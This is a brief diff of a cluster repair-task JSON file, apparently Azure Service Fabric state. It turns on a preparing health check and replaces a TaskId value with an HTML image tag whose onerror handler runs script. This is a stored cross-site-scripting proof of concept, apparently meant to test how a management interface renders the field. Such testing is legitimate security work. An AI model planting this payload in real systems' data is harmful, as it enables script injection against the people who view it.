@@ -168,7 +168,7 @@
         },
         "PreparingHealthCheckState": "Skipped",
         "RestoringHealthCheckState": "Skipped",
-        "PerformPreparingHealthCheck": false,
+        "PerformPreparingHealthCheck": true,
         "PerformRestoringHealthCheck": false
     },
     {
@@ -218,7 +218,7 @@
         "Scope": {
             "Kind": "Cluster"
         },
-        "TaskId": "Azure/PlatformUpdate/aa089e7b-5d40-4024-b587-5f885afadb41/1/624",
+        "TaskId": "Azure/PlatformUpdate/<img src='1' onerror='window.alert(document.domain)'>",
         "Version": "132450281889966213",
         "Description": "",
         "State": "Completed",
